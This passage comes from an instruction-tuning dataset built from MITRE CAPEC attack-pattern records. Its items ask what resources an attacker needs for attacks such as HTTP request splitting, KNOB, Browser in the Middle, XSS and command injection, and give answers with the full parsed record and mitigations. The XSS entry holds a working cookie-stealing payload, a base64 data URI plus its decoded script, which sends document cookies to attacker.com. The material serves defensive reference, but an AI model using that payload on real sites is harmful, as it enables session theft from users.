              "Description": "[Cause differential HTTP responses by experimenting with identified HTTP Request vulnerabilities] The adversary sends maliciously crafted HTTP requests with custom strings and embedded web scripts and objects in HTTP headers to interfere with the parsing of intermediary and back-end HTTP infrastructure, followed by normal/benign HTTP request from the adversary or a random user. The intended consequences of the malicious HTTP requests will be observed in the HTTP infrastructure response to the normal/benign HTTP request to confirm applicability of identified vulnerabilities in the adversary's plan of attack.",
              "Technique": [
                "Continue the monitoring of HTTP traffic.",
                {
                  "xhtml:p": [
                    "Utilize different sequences of special characters (CR - Carriage Return, LF - Line Feed, HT - Horizontal Tab, SP - Space and etc.) to bypass filtering and back-end encoding and to embed:",
                    "to utilize additional special characters (e.g., > and <) filtered by the target HTTP agent.",
                    "Note that certain special characters and character encoding may be applicable only to intermediary and front-end agents with rare configurations or that are not RFC compliant."
                  ],
                  "xhtml:ul": {
                    "xhtml:li": [
                      "additional HTTP Requests with their own headers",
                      "malicious web scripts into parameters of HTTP Request headers (e.g., browser cookies like Set-Cookie or Ajax web/browser object parameters like XMLHttpRequest)",
                      "adversary chosen encoding (e.g., UTF-7)"
                    ]
                  }
                },
                "Follow an unrecognized (sometimes a RFC compliant) HTTP header with a subsequent HTTP request to potentially cause the HTTP request to be ignored and interpreted as part of the preceding HTTP request."
              ]
            },
            {
              "Step": "1",
              "Phase": "Exploit",
              "Description": "[Perform HTTP Request Splitting attack] Using knowledge discovered in the experiment section above, smuggle a message to cause one of the consequences.",
              "Technique": "Leverage techniques identified in the Experiment Phase."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "An additional intermediary HTTP agent such as an application firewall or a web caching proxy between the adversary and the second agent such as a web server, that sends multiple HTTP messages over same network connection.",
            "Differences in the way the two HTTP agents parse and interpret HTTP requests and its headers.",
            "HTTP headers capable of being user-manipulated.",
            "HTTP agents running on HTTP/1.0 or HTTP/1.1 that allow for Keep Alive mode, Pipelined queries, and Chunked queries and responses."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Medium",
              "#text": "Detailed knowledge on HTTP protocol: request and response messages structure and usage of specific headers."
            },
            {
              "@Level": "Medium",
              "#text": "Detailed knowledge on how specific HTTP agents receive, send, process, interpret, and parse a variety of HTTP messages and headers."
            },
            {
              "@Level": "Medium",
              "#text": "Possess knowledge on the exact details in the discrepancies between several targeted HTTP agents in path of an HTTP message in parsing its message structure and individual headers."
            }
          ]
        },
        "Resources_Required": {
          "Resource": "Tools capable of crafting malicious HTTP messages and monitoring HTTP messages responses."
        },
        "Indicators": {
          "Indicator": "Differences in requests processed by the two agents. This requires careful monitoring or a capable log analysis tool."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: evaluate HTTP agents prior to deployment for parsing/interpretation discrepancies.",
            "Configuration: front-end HTTP agents notice ambiguous requests.",
            "Configuration: back-end HTTP agents reject ambiguous requests and close the network connection.",
            "Configuration: Disable reuse of back-end connections.",
            "Configuration: Use HTTP/2 for back-end connections.",
            "Configuration: Use the same web server software for front-end and back-end server.",
            "Implementation: Utilize a Web Application Firewall (WAF) that has built-in mitigation to detect abnormal requests/responses.",
            "Configuration: Install latest vendor security patches available for both intermediary and back-end HTTP infrastructure (i.e. proxies and web servers)",
            "Configuration: Ensure that HTTP infrastructure in the chain or network path utilize a strict uniform parsing process.",
            "Implementation: Utilize intermediary HTTP infrastructure capable of filtering and/or sanitizing user-input."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "Microsoft Internet Explorer versions 5.01 SP4 and prior, 6.0 SP2 and prior, and 7.0 contain a vulnerability that could allow an unauthenticated, remote adversary to conduct HTTP request splitting and smuggling attacks. The vulnerability is due to an input validation error in the browser that allows adversaries to manipulate certain headers to expose the browser to HTTP request splitting and smuggling attacks. Attacks may include cross-site scripting, proxy cache poisoning, and session fixation. In certain instances, an exploit could allow the adversary to bypass web application firewalls or other filtering devices. Microsoft has confirmed the vulnerability and released software updates."
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "74"
            },
            {
              "@CWE_ID": "113"
            },
            {
              "@CWE_ID": "138"
            },
            {
              "@CWE_ID": "436"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "WASC",
            "Entry_ID": "24",
            "Entry_Name": "HTTP Request Splitting"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-117"
            },
            {
              "@External_Reference_ID": "REF-617"
            },
            {
              "@External_Reference_ID": "REF-679"
            }
          ]
        },
        "Notes": {
          "Note": [
            {
              "@Type": "Terminology",
              "#text": "HTTP Splitting \u2013 \"the act of forcing a sender of (HTTP) messages to emit data stream consisting of more messages than the sender\u2019s intension. The messages sent are 100% valid and RFC compliant\" [REF-117]."
            },
            {
              "@Type": "Terminology",
              "#text": "HTTP Smuggling \u2013 \"the act of forcing a sender of (HTTP) messages to emit data stream which may be parsed as a different set of messages (i.e. dislocated message boundaries) than the sender\u2019s intention. This is done by virtue of forcing the sender to emit non-standard messages which can be interpreted in more than one way\" [REF-117]."
            },
            {
              "@Type": "Relationship",
              "#text": "HTTP Smuggling is an evolution of previous HTTP Splitting techniques which are commonly remediated against."
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Related_Attack_Patterns, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated @Abstraction, References, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated @Status, Consequences, Description, Example_Instances, Execution_Flow, Extended_Description, Indicators, Mitigations, Notes, Prerequisites, References, Related_Attack_Patterns, Related_Weaknesses, Resources_Required, Skills_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Extended_Description, Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Key Negotiation of Bluetooth Attack (KNOB) (CAPEC ID: 668)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Key Negotiation of Bluetooth Attack (KNOB) (CAPEC ID: 668):\nBluetooth adapter, packet capturing capabilities.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Bluetooth adapter, packet capturing capabilities.",
      "@Name": "Key Negotiation of Bluetooth Attack (KNOB) (CAPEC ID: 668)",
      "attack_ptrn": {
        "@ID": "668",
        "@Name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary can exploit a flaw in Bluetooth key negotiation allowing them to decrypt information sent between two devices communicating via Bluetooth. The adversary uses an Adversary in the Middle setup to modify packets sent between the two devices during the authentication process, specifically the entropy bits. Knowledge of the number of entropy bits will allow the attacker to easily decrypt information passing over the line of communication.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "115"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "148"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Discovery] Using an established Person in the Middle setup, search for Bluetooth devices beginning the authentication process.",
              "Technique": "Use packet capture tools."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Change the entropy bits] Upon recieving the initial key negotiation packet from the master, the adversary modifies the entropy bits requested to 1 to allow for easy decryption before it is forwarded."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Capture and decrypt data] Once the entropy of encryption is known, the adversary can capture data and then decrypt on their device."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Person in the Middle network setup."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Ability to modify packets."
          }
        },
        "Resources_Required": {
          "Resource": "Bluetooth adapter, packet capturing capabilities."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Bypass Protection Mechanism"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Newer Bluetooth firmwares ensure that the KNOB is not negotaited in plaintext. Update your device."
        },
        "Example_Instances": {
          "Example": "Given users Alice, Bob and Charlie (Charlie being the attacker), Alice and Bob begin to agree on an encryption key when connecting. While Alice sends a message to Bob that an encryption key with 16 bytes of entropy should be used, Charlie changes this to 1 and forwards the request to Bob and continues forwarding these packets until authentication is successful."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "425"
            },
            {
              "@CWE_ID": "285"
            },
            {
              "@CWE_ID": "693"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1565.002",
            "Entry_Name": "Data Manipulation: Transmitted Data Manipulation"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-657"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2021-06-24"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2022-09-29",
            "Modification_Comment": "Updated Taxonomy_Mappings"
          }
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Browser in the Middle (BiTM) (CAPEC ID: 701), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nA web application with a client is needed to enable the victim's browser to establish a remote desktop connection to the system of the adversary.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A web application with a client is needed to enable the victim's browser to establish a remote desktop connection to the system of the adversary.",
      "@Name": "Browser in the Middle (BiTM) (CAPEC ID: 701)",
      "attack_ptrn": {
        "@ID": "701",
        "@Name": "Browser in the Middle (BiTM)",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary exploits the inherent functionalities of a web browser, in order to establish an unnoticed remote desktop connection in the victim's browser to the adversary's system. The adversary must deploy a web client with a remote desktop session that the victim can access.",
        "Extended_Description": {
          "xhtml:p": "Unlike Adversary in the Browser, the victim does not need to install a malicious application. Browser in the Middle uses the inherent functionalities of a web browser to convince the victim they are browsing normally under the assumption that the connection is secure. All the actions performed by the victim in the open window are actually performed on the machine of the adversary. These victim-authenticated sessions are available to the adversary to use. All entered data such as passwords and usernames can be logged by the adversary and the content displayed to the victim can be altered arbitrarily. Varieties of multifactor authentication which rely solely on user input and do not use a form of hardware-based secret exchange are vulnerable to browser in the middle."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "94"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "148"
            },
            {
              "@Nature": "CanFollow",
              "@CAPEC_ID": "98"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify potential targets] The adversary identifies an application or service that the target is likely to use.",
              "Technique": "The adversary stands up a server to host the transparent browser and entices victims to use it by using a domain name similar to the legitimate application. In addition to the transparent browser, the adversary could also install a web proxy, sniffer, keylogger, and other tools to assist in their goals."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Lure victims] The adversary crafts a phishing campaign to lure unsuspecting victims into using the transparent browser.",
              "Technique": "An adversary can create a convincing email with a link to download the web client and interact with the transparent browser."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Monitor and Manipulate Data] When the victim establishes the connection to the transparent browser, the adversary can view victim activity and make alterations to what the victim sees when browsing the web.",
              "Technique": "Once a victim has established a connection to the transparent browser, the adversary can use installed tools such as a web proxy, keylogger, or additional malicious browser extensions to gather and manipulate data or impersonate the victim."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The adversary must create a convincing web client to establish the connection. The victim then needs to be lured onto the adversary's webpage. In addition, the victim's machine must not use local authentication APIs, a hardware token, or a Trusted Platform Module (TPM) to authenticate."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium"
          }
        },
        "Resources_Required": {
          "Resource": "A web application with a client is needed to enable the victim's browser to establish a remote desktop connection to the system of the adversary."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authentication"
              ],
              "Impact": "Gain Privileges",
              "Likelihood": "High"
            },
            {
              "Scope": [
                "Confidentiality",
                "Authorization"
              ],
              "Impact": "Read Data",
              "Likelihood": "High"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data",
              "Likelihood": "Medium"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Implementation: Use strong, mutual authentication to fully authenticate with both ends of any communications channel"
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "294"
            },
            {
              "@CWE_ID": "345"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-747"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "Jonas Tzschoppe",
            "Submission_Organization": "Nuremberg Institute of Technology",
            "Submission_Date": "2023-01-24"
          }
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: XSS Targeting URI Placeholders (CAPEC ID: 244)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern XSS Targeting URI Placeholders (CAPEC ID: 244):\nAbility to send HTTP request to a web application",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Ability to send HTTP request to a web application",
      "@Name": "XSS Targeting URI Placeholders (CAPEC ID: 244)",
      "attack_ptrn": {
        "@ID": "244",
        "@Name": "XSS Targeting URI Placeholders",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attack of this type exploits the ability of most browsers to interpret \"data\", \"javascript\" or other URI schemes as client-side executable content placeholders. This attack consists of passing a malicious URI in an anchor tag HREF attribute or any other similar attributes in other HTML tags. Such malicious URI contains, for example, a base64 encoded HTML content with an embedded cross-site scripting payload. The attack is executed when the browser interprets the malicious content i.e., for example, when the victim clicks on the malicious link.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "591"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "592"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "588"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.",
              "Technique": [
                "Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.",
                "Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.",
                "Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Probe identified potential entry points for reflected XSS vulnerability] The adversary uses the entry points gathered in the \"Explore\" phase as a target list and injects various payloads formatted as data URI schemes using base to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.",
              "Technique": [
                "Use a list of XSS probe strings using different URI schemes to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier to trace the injected string back to the entry point.",
                "Use a proxy tool to record results of manual input of XSS probes in known URLs."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.",
              "Technique": [
                "Change a URL parameter to include a malicious payload formatted as a URI scheme, or use the URL returned when the URI scheme was given as input to the web application.",
                "Send information gathered from the malicious script to a remote endpoint."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.",
              "Technique": [
                "Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.",
                "Put the malicious URL on a public forum, where many victims might accidentally click the link."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Target client software must allow scripting such as JavaScript and allows executable content delivered using a data URI scheme."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "To inject the malicious payload in a web page"
          }
        },
        "Resources_Required": {
          "Resource": "Ability to send HTTP request to a web application"
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Authorization",
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Accountability",
                "Authentication",
                "Authorization",
                "Non-Repudiation"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Access Control",
                "Authorization"
              ],
              "Impact": "Bypass Protection Mechanism"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Use browser technologies that do not allow client side scripting.",
            "Design: Utilize strict type, character, and encoding enforcement.",
            "Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.",
            "Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.",
            "Implementation: Perform input validation for all remote content, including remote and user-generated content",
            "Implementation: Perform output validation for all remote content.",
            "Implementation: Disable scripting languages such as JavaScript in browser",
            "Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "The following payload data:",
              "represents a base64 encoded HTML and uses the data URI scheme to deliver it to the browser.",
              "The decoded payload is the following piece of HTML code:",
              "Web applications that take user controlled inputs and reflect them in URI HTML placeholder without a proper validation are at risk for such an attack.",
              "An adversary could inject the previous payload that would be placed in a URI placeholder (for example in the anchor tag HREF attribute):",
              "Once the victim clicks on the link, the browser will decode and execute the content from the payload. This will result on the execution of the cross-site scripting attack."
            ],
            "xhtml:div": [
              {
                "@style": "margin-left:1em;",
                "@class": "informative",
                "#text": "text/html;base64,PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgaW1nID0gbmV3IEltYWdlKCk7IGltZy5zcmMgPSAiaHR0cDovL2F0dGFja2VyLmNvbS9jb29raWVncmFiYmVyPyIrIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWVzKTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg=="
              },
              {
                "@style": "margin-left:1em;",
                "@class": "informative",
                "xhtml:div": {
                  "@style": "margin-left:1em;",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": {
                      "@style": "margin-left:1em;",
                      "xhtml:br": null,
                      "#text": "var img = new Image();img.src = \"http://attacker.com/cookiegrabber?\"+ encodeURIComponent(document.cookies);"
                    },
                    "xhtml:br": null,
                    "#text": "<script>\n                        </script>"
                  },
                  "xhtml:br": null,
                  "#text": "<body>\n                     </body>"
                },
                "xhtml:br": null,
                "#text": "<html>\n                  </html>"
              },
              {
                "@style": "margin-left:1em;",
                "@class": "informative",
                "#text": "<a href=\"INJECTION_POINT\">My Link</a>"
              }
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "83"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-70",
              "@Section": "Testing for Cross site scripting"
            },
            {
              "@External_Reference_ID": "REF-96"
            },
            {
              "@External_Reference_ID": "REF-97",
              "@Section": "XSS Filter Evasion Cheat Sheet"
            },
            {
              "@External_Reference_ID": "REF-72",
              "@Section": "WASC-08 - Cross Site Scripting"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Related_Attack_Patterns, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Consequences, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2017-05-01",
            "#text": "Cross-Site Scripting via Encoded URI Schemes"
          }
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Scanning for Vulnerable Software (CAPEC ID: 310), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nProbing requires the ability to interactively send and receive data from a target, whereas passive listening requires a sufficient understanding of the protocol to analyze a preexisting channel of communication.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Probing requires the ability to interactively send and receive data from a target, whereas passive listening requires a sufficient understanding of the protocol to analyze a preexisting channel of communication.",
      "@Name": "Scanning for Vulnerable Software (CAPEC ID: 310)",
      "attack_ptrn": {
        "@ID": "310",
        "@Name": "Scanning for Vulnerable Software",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker engages in scanning activity to find vulnerable software versions or types, such as operating system versions or network services. Vulnerable or exploitable network configurations, such as improperly firewalled systems, or misconfigured systems in the DMZ or external network, provide windows of opportunity for an attacker. Common types of vulnerable software include unpatched operating systems or services (e.g FTP, Telnet, SMTP, SNMP) running on open ports that the attacker has identified. Attackers usually begin probing for vulnerable software once the external network has been port scanned and potential targets have been revealed.",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "541"
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "Access to the network on which the targeted system resides.",
            "Software tools used to probe systems over a range of ports and protocols."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "To probe a system remotely without detection requires careful planning and patience."
          }
        },
        "Resources_Required": {
          "Resource": "Probing requires the ability to interactively send and receive data from a target, whereas passive listening requires a sufficient understanding of the protocol to analyze a preexisting channel of communication."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Other"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 56"
            },
            {
              "@External_Reference_ID": "REF-128"
            },
            {
              "@External_Reference_ID": "REF-130"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References, Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Command Delimiters (CAPEC ID: 15)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Command Delimiters (CAPEC ID: 15):\nAbility to communicate synchronously or asynchronously with server. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Ability to communicate synchronously or asynchronously with server. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.",
      "@Name": "Command Delimiters (CAPEC ID: 15)",
      "attack_ptrn": {
        "@ID": "15",
        "@Name": "Command Delimiters",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attack of this type exploits a programs' vulnerabilities that allows an attacker's commands to be concatenated onto a legitimate command with the intent of targeting other resources such as the file system or database. The system that uses a filter or denylist input validation, as opposed to allowlist validation is vulnerable to an attacker who predicts delimiters (or combinations of delimiters) not present in the filter or denylist. As with other injection attacks, the attacker uses the command delimiter payload as an entry point to tunnel through the application and activate additional attacks through SQL queries, shell commands, network scanning, and so on.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "137",
            "Exclude_Related": {
              "@Exclude_ID": "403"
            }
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Assess Target Runtime Environment] In situations where the runtime environment is not implicitly known, the attacker makes connections to the target system and tries to determine the system's runtime environment. Knowing the environment is vital to choosing the correct delimiters.",
              "Technique": [
                "Port mapping using network connection-based software (e.g., nmap, nessus, etc.)",
                "Port mapping by exploring the operating system (netstat, sockstat, etc.)",
                "TCP/IP Fingerprinting",
                "Induce errors to find informative error messages"
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Survey the Application] The attacker surveys the target application, possibly as a valid and authenticated user",
              "Technique": [
                "Spidering web sites for all available links",
                "Inventory all application inputs"
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Attempt delimiters in inputs] The attacker systematically attempts variations of delimiters on known inputs, observing the application's response each time.",
              "Technique": [
                "Inject command delimiters using network packet injection tools (netcat, nemesis, etc.)",
                "Inject command delimiters using web test frameworks (proxies, TamperData, custom programs, etc.)",
                "Enter command delimiters directly in input fields."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Use malicious command delimiters] The attacker uses combinations of payload and carefully placed command delimiters to attack the software."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Software's input validation or filtering must not detect and block presence of additional malicious command."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The attacker has to identify injection vector, identify the specific commands, and optionally collect the output, i.e. from an interactive session."
          }
        },
        "Resources_Required": {
          "Resource": "Ability to communicate synchronously or asynchronously with server. Optionally, ability to capture output directly through synchronous communication or other method such as FTP."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Perform allowlist validation against a positive specification for command length, type, and parameters.",
